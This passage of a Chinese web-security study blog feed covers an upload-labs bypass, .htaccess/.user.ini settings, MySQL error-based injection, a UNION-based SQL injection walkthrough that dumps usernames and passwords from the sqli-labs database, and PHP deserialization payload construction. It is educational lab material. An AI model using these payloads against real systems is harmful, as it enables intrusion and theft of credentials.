class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span><br>    <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>可以用点空格点来绕过，<kbd>$img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;</kbd>​因为加载的是文件名字，检测的是文件后缀</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>文件上传</category>
      
      <category>upload-labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>空格点绕过</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>配置文件详解</title>
    <link href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/"/>
    <url>/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="配置文件详解"><a href="#配置文件详解" class="headerlink" title="配置文件详解"></a>配置文件详解</h1><h1 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h1><blockquote><p>作用:·分布式配置文件，一般用于 URL·重写、认证、访问控制等<br>作用范围:特定目录(一般是网站根目录)及其子目录<br>优先级:<strong>较高</strong>，可覆盖Apache·的主要配置文件(httpd-conf)<br>生效方式:修改后立刻生效</p></blockquote><h1 id="httpd-conf"><a href="#httpd-conf" class="headerlink" title="httpd-conf"></a>httpd-conf</h1><blockquote><p>作用:°包含 Apache·HTTP.服务器的全局行为和默认设置<br>作用范围:整个服务器<br>优先级:<strong>较低</strong><br>生效方式:管理员权限，重启服务器后生效</p></blockquote><h1 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h1><blockquote><p>作用:特定于用户或特定目录的配置文件,通常位于·Web·应用程序的根目录下。<br>它用于覆盖或追加全局配置文件(如·php.ini)中的·PHP.配置选项。<br>作用范围:存放该文件的目录以及其子目录<br>优先级:<strong>较高</strong>，可以覆盖 php.ini<br>生效方式:立即生效</p></blockquote><h1 id="php-ini"><a href="#php-ini" class="headerlink" title=".php.ini"></a>.php.ini</h1><blockquote><p>作用:存储了对整个·PHP.环境生效的配置选项。它通常位于·PHP.安装目录中<br>作用范围:所有运行在该·PHP·环境中的·PHP·请求<br>优先级:·较低<br>生效方式:重启 php 或 web 服务器</p></blockquote><p>‍</p><p>加载方式:会首先加载·php.ini&#x2F;httpd-conf 文件中的配置。然而，如果在某个目录下存在·.userini&#x2F;.htaccess:文件,服务器会在处理请求时检查该目录,并覆盖相应的配置项。</p><p>‍</p><h1 id="user-ini可以生效的前提"><a href="#user-ini可以生效的前提" class="headerlink" title=".user.ini可以生效的前提:"></a>.user.ini可以生效的前提:</h1><p>最好大于 5.3.0，最好是用 7.X 版本的<br>Server·AP!.为 CGl&#x2F;FastCG——Phpinfo()查看Server·API<br>(Server·API(Application·Programming·Interface，应用程序编程接<br>口)是一组定义了软件组件之间交互方式的规范。在这种情况下<br>Server·API·是指用于连接和交互的服务器端软件接口。)<br>user.ini 文件上传漏洞的前提:<br>.user.ini 可以生效并且该上传目录有 php 文件</p><p>‍</p><h1 id="user-ini文件上传漏洞的前提："><a href="#user-ini文件上传漏洞的前提：" class="headerlink" title=".user.ini文件上传漏洞的前提："></a>.user.ini文件上传漏洞的前提：</h1><p>.user.ini可以生效并且该上传目录<span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">有php文件</span></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>文件上传</category>
      
      <category>upload-labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>配置文件详解</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mysql</title>
    <link href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/Mysql/"/>
    <url>/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/Mysql/</url>
    
    <content type="html"><![CDATA[<h1 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h1><h1 id="Mysql学习"><a href="#Mysql学习" class="headerlink" title="Mysql学习"></a><a href="https://blog.csdn.net/qq_45173404/article/details/115712758">Mysql学习</a></h1><h1 id="列出所有数据库"><a href="#列出所有数据库" class="headerlink" title="列出所有数据库"></a>列出所有数据库</h1><p><span data-type="text" style="color: var(--b3-font-color12);">SHOW DATABASES;</span></p><p>‍</p><h1 id="查看某一个数据库里所有的表"><a href="#查看某一个数据库里所有的表" class="headerlink" title="查看某一个数据库里所有的表"></a>查看某一个数据库里所有的表</h1><p><span data-type="text" style="color: var(--b3-font-color12);">USE databasename;</span></p><p><span data-type="text" style="color: var(--b3-font-color12);">USE mysql;</span></p><p><span data-type="text" style="color: var(--b3-font-color12);">SHOW TABLES;</span></p><p>‍</p><p><span data-type="text" style="color: var(--b3-font-color12);">SHOW TABLES FROM mysql;</span></p><p>‍</p><h1 id="select函数"><a href="#select函数" class="headerlink" title="select函数"></a>select函数</h1><p><span data-type="text" style="color: var(--b3-font-color12);">SELECT NOW();</span>   – 查看当前时间</p><p>‍</p><p><span data-type="text" style="color: var(--b3-font-color12);">use information_schema;</span></p><p><span data-type="text" style="color: var(--b3-font-color12);">SELECT DATABASE</span></p><p>‍</p><p><span data-type="text" style="color: var(--b3-font-color12);">SELECT VERSION(); </span>– 查看版本</p><p>‍</p><p><span data-type="text" style="color: var(--b3-font-color12);">SELECT USER();</span> – 查看当前登录数据库的用户</p><p>‍</p><p><span data-type="text" style="color: var(--b3-font-color12);">SELECT @@datadir;</span> – 查看数据路径</p><p><span data-type="text" style="color: var(--b3-font-color12);">SELECT @@basedir;</span> – 查看mysql安装路径</p><p><span data-type="text" style="color: var(--b3-font-color12);">SELECT @@vesion_compile_os;</span> – 查看mysql安装的系统</p><p>‍</p><h2 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h2><p><span data-type="text" style="color: var(--b3-font-color12);">SELECT * FROM mysql.user;</span> – SELECT 查询关键字     #  ***** 代表所有</p><p><span data-type="text" style="color: var(--b3-font-color8);">eg:</span> <span data-type="text" style="color: var(--b3-font-color9);">SELECT USER,HOST FROM mysql.user;</span></p><p><span data-type="text" style="color: var(--b3-font-color12);">SELECT schema_name FROM information_schema.’SCHEMATA’;</span></p><p><span data-type="text" style="color: var(--b3-font-color12);">SELECT * FROM information.tables;</span></p><h2 id="where-相当于编程语言里面的if"><a href="#where-相当于编程语言里面的if" class="headerlink" title="where 相当于编程语言里面的if"></a>where 相当于编程语言里面的if</h2><p><span data-type="text" style="color: var(--b3-font-color9);">SELECT USER,HOST FROM mysql.user WHERE USER &#x3D; ‘root’;</span> – mysql里面都是单引号</p><h2 id="创建库"><a href="#创建库" class="headerlink" title="创建库"></a>创建库</h2><p><span data-type="text" style="color: var(--b3-font-color12);">CREATE DATABASE test CHARSET utf8mb4;</span></p><h2 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h2><p>‍</p><p><span data-type="text" style="color: var(--b3-font-color12);">CREATE TABLE t1(id INT);</span></p><p>DROP TABLE t1;</p><p>‍</p><p>SHOW TABLES FROM test;</p><p>ALTER TABLE t1 ADD NAME VARCHAR(32);</p><p><span data-type="text" style="color: var(--b3-font-color12);">DESC t1;</span></p><h2 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h2><p>INSERT INTO t1 VALUES (1,”张三”),(2,”李四”),(3,”王五”)</p><p>SELECT * FROM t1;</p><p>‍</p><p><span data-type="text" style="color: var(--b3-font-color12);">SELECT DATABASE();</span></p><p><span data-type="text" style="color: var(--b3-font-color12);">SELECT * FROM information_schema.tables WHERE table_schema &#x3D;’test’;</span> – 传库名</p><p>‍</p><p>‍</p><p><span data-type="text" style="color: var(--b3-font-color12);">SELECT * FROM test.t1 WHERE NAME &#x3D; ‘张三’ AND id &#x3D; 1 ;</span></p><p>‍</p><h2 id="union"><a href="#union" class="headerlink" title="union"></a>union</h2><p>SELECT * FROM test.t1 UNION SELECT 1,2,3,4,5;</p><p>SELECT USER,HOST FROM mysql.user UNION SELECT * FROM test.’t1’;</p><p>‍</p><p>（rand：生成0~1的随机数 floor向下取整）</p><p>select * from users group by name;(将相同名字的分层一个组)</p><p>select name,count(*) from users group by name;</p><p>在执行 group by name 语句时，MySQL 会在内部建立一个虚拟表，用来储存列的数据，表中会有一个 group 的 key 值作为表的主键，这里的主键就是用来分类的name列中获取的数据，当查询数据时，读取数据库数据，然后查看虚拟表中是否存在，不存在则插入新纪录，当读取到第一行数据时，发现name字段的admin不存在，将admin放入主键列中，1放在id列中;然后指针下移，继续读取数据表中的数据，读到第三行的 name 字段为 admin数据时，发现 admin 在虚拟表中已经存在，就汇总在一起，虚拟表如下如此循环，查询完所有的表后，虚拟表为如下所示，但是显示的结果在数据库中如下，因为以 name 分组，id 值取最前面一个，形成结果数据表显示出来</p><p>select name,id from users group by name; 只取第一个出来</p><p>当我们加上count(<em>)函数时，操作过程为:查看虚拟表是否存在该主键值，不存在则插入新记录，存在则count(</em>)字段直接加1，这样就能对上面的分类结果进行统计，然后将统计结果返回:</p><p>select id,name,concat((select database()),0x7e,floor(rand(0)*2)) as a from users;</p><p>select count(*),concat((select database()),0x7e,floor(rand(0)*2)) as a from users group by a ; **(此时group by的对象是a，a&#x3D;concat((select database()),0x7e,floor(rand(0)<em>2)),as a的意思也就是把前面的当作a为一个别名)</em>*</p><blockquote><p>第一次:<br>1:先查询虚拟表 有无a数据，比如第一次査询时为a&#x3D;sqli<del>0(也有可能是其他值)<br>2:查询无对应的数据，执行插入操作，插入时该语句再次执行，比如此时a&#x3D;sqli</del>0(也有可能是其他值)</p></blockquote><blockquote><p>第二次:<br>1.先查询虚拟表 有无a数据，比如第二次查询时还是a&#x3D;sqli~01:<br>2:查询无对应的数据，执行插入操作，插入时该语句再次执行，比如插入时，此时a&#x3D;sqli-0，执行insert操作就会报错，因为key主键对应的列内容不允许重复</p></blockquote><p>当随机到相同的0或者1key键值的时候就会报错就会把这个爆出来</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>注入漏洞</category>
      
      <category>SQL注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Mysql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基础注入流程</title>
    <link href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B/"/>
    <url>/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="基础注入流程"><a href="#基础注入流程" class="headerlink" title="基础注入流程"></a>基础注入流程</h1><h2 id="SQL注入流程"><a href="#SQL注入流程" class="headerlink" title="SQL注入流程"></a>SQL注入流程</h2><pre><code class="hljs">**1、寻找注入点：**和数据库有交互  ？aa=bbb**2、判断闭合方式(依靠数字型不需要闭合，字符型需要闭合）**?id=1asdf  看是否报错：有报错：数字型  无报错：字符型</code></pre><p>方法二：判断出注入类型涉及到了后续的注入过程中需不需要闭合单引号(‘)，通过“1and 1&#x3D;1#”和“1’and 1&#x3D;2#”进行判断，如果页面有不同的变化，则说明是字符型的注入，因为字符型的参数是需要引号引起来的。</p><pre><code class="hljs">**3、再判断闭合方式**?id=1asdf&#39; 通过 () “” ‘’ 必须两两互相匹配的道理来判断闭合的方式</code></pre><blockquote><p>select * from users where id&#x3D;’1asdf’ – ‘ limit 0,1</p></blockquote><pre><code class="hljs">**4、判断数据库有几列以及回显位**</code></pre><blockquote><p>?id &#x3D; 1’ order by 3 –+来实现判断这个数据库有几列  （–+是注释的意思）<br><img src="/.com//image-20250113172420-37zqzqi.png" alt="image">order by即通过第几列排序的意思</p></blockquote><pre><code class="hljs">?id=-1&#39; union select1,2,3 --+ 我们改成-1是为了前面不查询类容用union展示，这个也是为了判断回显位 **获取数据库名 ： security**​​</code></pre><blockquote><p>将回显位改为database()  ?id&#x3D;-1’ union select1,database(),3 –+</p></blockquote><pre><code class="hljs">**获取表名 ：emails，less39，referers，uagents，users**</code></pre><blockquote><p>?id=1’union select 1,2,group_concat(table_name) from information_schema.t<br> ables where table_schema=database()</p></blockquote><blockquote><p>?id&#x3D;-1’ union select1,(select group<a href>_concat(table</a>_name) from information_schema.tables where table_schema&#x3D;’security’ ),3 –+</p></blockquote><pre><code class="hljs">**group_concat:**  把它合并成一个字符串**tables_name:**  表名**information_schema:**  MYSQL下的一个数据库</code></pre><p>‍</p><pre><code class="hljs">**获取列名：获取users表的列名：id，username，password**</code></pre><blockquote><p>?id&#x3D;-1’ union select 1,(select group_concat(column_name) from information_schema.columns where tables_schema&#x3D;’security’ and table_name &#x3D; ‘users’),3 –+</p></blockquote><pre><code class="hljs">**获取具体数据：**</code></pre><blockquote><p>?id &#x3D; -1’ union select 1,(select group_concat(username) from users),3 –+</p></blockquote><p>‍</p><h3 id="取库名："><a href="#取库名：" class="headerlink" title="取库名："></a>取库名：</h3><blockquote><p>?id&#x3D;-1’ union select 1,2,group_concat(schema_name) from information_schema.schemata–+</p></blockquote><h3 id="取表名："><a href="#取表名：" class="headerlink" title="取表名："></a>取表名：</h3><blockquote><p>?id&#x3D;-1’ union select1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’,3 –+</p></blockquote><h3 id="取列名："><a href="#取列名：" class="headerlink" title="取列名："></a>取列名：</h3><blockquote><p>?id&#x3D;-1’ union select1,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’,3 –+</p></blockquote><h3 id="取密码，用户名："><a href="#取密码，用户名：" class="headerlink" title="取密码，用户名："></a>取密码，用户名：</h3><blockquote><p>?id&#x3D;-1’ union select1,group_concat(password) from security.users,3 –+</p></blockquote><h3 id="拼接用户名和密码"><a href="#拼接用户名和密码" class="headerlink" title="拼接用户名和密码"></a>拼接用户名和密码</h3><blockquote><p><strong>concat_ws(‘~’,A,B)</strong>  拼接 A~B</p></blockquote><blockquote><p>?id&#x3D;-1’ union select1,group_concat(concat_ws(‘~’,username,password)) from security.users,3 –+</p></blockquote><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>注入漏洞</category>
      
      <category>SQL注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础注入流程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入靶场</title>
    <link href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/"/>
    <url>/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="sql注入靶场"><a href="#sql注入靶场" class="headerlink" title="sql注入靶场"></a>sql注入靶场</h1><p><a href="https://www.freebuf.com/articles/web/339118.html">sql末尾</a>    <a href="https://blog.csdn.net/Joker_Dgh/article/details/123913722">sql-labs搭建</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>注入漏洞</category>
      
      <category>SQL注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反序列化详解</title>
    <link href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/"/>
    <url>/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="反序列化详解"><a href="#反序列化详解" class="headerlink" title="反序列化详解"></a>反序列化详解</h1><h3 id="什么是序列化"><a href="#什么是序列化" class="headerlink" title="什么是序列化"></a>什么是序列化</h3><blockquote><p>将各种类型的数据压缩按照一定格式存储的过程 使用函数serialize()</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//源代码</span><br><span class="hljs-meta">&lt;?php</span>0－<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DEMO1</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&#x27;evil&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;phpinfo()&#x27;</span>;<br>    ...一些方法 不过序列化不在意这些<br>&#125;<br><span class="hljs-comment">//序列化结果</span><br>O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;DEMO1&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;evi l&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;arg&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;<br><br>这里的O表示这是一个对象<br>    对象名占<span class="hljs-number">5</span>个字符<br>    对象名是DEMO1<br>    对象有<span class="hljs-number">2</span>个属性<br>    注意属性的长度存在不可见字符<span class="hljs-number">0</span>  用来区分属性 是<span class="hljs-keyword">public</span> 还是<span class="hljs-keyword">private</span> 或者<span class="hljs-keyword">protected</span><br></code></pre></td></tr></table></figure><h3 id="什么是反序列化"><a href="#什么是反序列化" class="headerlink" title="什么是反序列化"></a>什么是反序列化</h3><blockquote><p><a href="https://so.csdn.net/so/search?q=php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">php反序列化</a>漏洞又称**&#x3D;&#x3D;对象注入&#x3D;&#x3D;** ， 可能会导致&#x3D;&#x3D;远程代码执行（RCE）&#x3D;&#x3D;</p><p>理解为&#x3D;&#x3D;漏洞执行unserialize函数&#x3D;&#x3D; 调用某一类并&#x3D;&#x3D;执行魔术方法&#x3D;&#x3D; 之后&#x3D;&#x3D;执行类中的函数&#x3D;&#x3D; 产生安全问题</p></blockquote><blockquote><h3 id="漏洞前提"><a href="#漏洞前提" class="headerlink" title="漏洞前提"></a>漏洞前提</h3><ol><li>unserialize()函数的&#x3D;&#x3D;变量可控&#x3D;&#x3D;</li><li>php文件中存在&#x3D;&#x3D;可利用的类&#x3D;&#x3D;，类中有&#x3D;&#x3D;魔术方法&#x3D;&#x3D;</li></ol></blockquote><h3 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h3><blockquote><h5 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h5><ol><li>把题目代码<strong>复制</strong>到本地</li><li>&#x3D;&#x3D;注释掉方法&#x3D;&#x3D;和&#x3D;&#x3D;一些没有用的东西&#x3D;&#x3D;</li><li>本地对&#x3D;&#x3D;属性赋值&#x3D;&#x3D;，&#x3D;&#x3D;构造序列化&#x3D;&#x3D;，<strong>url编码后输出</strong>，避免把&#x3D;&#x3D;不可见字符&#x3D;&#x3D;的影响</li></ol></blockquote><h5 id="操作过程举例："><a href="#操作过程举例：" class="headerlink" title="操作过程举例："></a>操作过程举例：</h5><p>对源代码进行注释后赋值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DEMO1</span></span>&#123;<br>    <span class="hljs-comment">//赋值</span><br><span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&#x27;evil&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;phpinfo()&#x27;</span>;<br><br><span class="hljs-comment">// public function safe()&#123;</span><br><span class="hljs-comment">// echo $this-&gt;arg;</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-comment">// public function evil() &#123;</span><br><span class="hljs-comment">// eval($this-&gt;arg);</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-comment">// public function run()&#123;</span><br><span class="hljs-comment">// $this-&gt;&#123;$this-&gt;func&#125;();</span><br><span class="hljs-comment">// &#125;</span><br>&#125;<br><span class="hljs-comment">// $obj = unserialize($_GET[&#x27;a&#x27;]);</span><br><span class="hljs-comment">// $obj-&gt;run();</span><br></code></pre></td></tr></table></figure><p>然后再在最后输出结果</p><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DEMO1</span>()));    <span class="hljs-comment">//单纯序列化</span><br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DEMO1</span>())));    <span class="hljs-comment">//进行url编码</span><br></code></pre></td></tr></table></figure></blockquote><p>‍</p><h3 id="三种赋值"><a href="#三种赋值" class="headerlink" title="三种赋值"></a>三种赋值</h3><p>内部直接赋值 只能赋值字符串</p><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DEMO1</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&#x27;evil&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DEMO1</span>()));<br></code></pre></td></tr></table></figure></blockquote><p>外部赋值 只能访问public属性的变量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DEMO1</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&#x27;evil&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;phpinfo()&#x27;</span>;<br>&#125;<br><span class="hljs-comment">//新建一个然后直接输出这个$o</span><br><span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DEMO1</span>();<br><span class="hljs-variable">$o</span> -&gt; func = <span class="hljs-string">&#x27;evil&#x27;</span>;<br><span class="hljs-variable">$o</span> -&gt; arg = <span class="hljs-string">&#x27;phpinfo();&#x27;</span><br>    <br><span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$o</span>)); <br></code></pre></td></tr></table></figure><blockquote><p><strong>小技巧：</strong>  对于php7.1+版本，对属性容错机制较高，就算不是public也可以在本地修改成public</p></blockquote><h6 id="构造方法赋值-万能方法-解决上述所有麻烦"><a href="#构造方法赋值-万能方法-解决上述所有麻烦" class="headerlink" title="构造方法赋值 (万能方法)解决上述所有麻烦"></a>构造方法赋值 (万能方法)解决上述所有麻烦</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DEMO1</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span> -&gt; func = <span class="hljs-string">&#x27;evil&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span> -&gt; arg = <span class="hljs-title function_ invoke__">phpinfo</span>();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DEMO1</span>()));<br></code></pre></td></tr></table></figure><p>‍</p><h3 id="POP-chain"><a href="#POP-chain" class="headerlink" title="POP chain"></a>POP chain</h3><h4 id="魔术方法："><a href="#魔术方法：" class="headerlink" title="魔术方法："></a>魔术方法：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 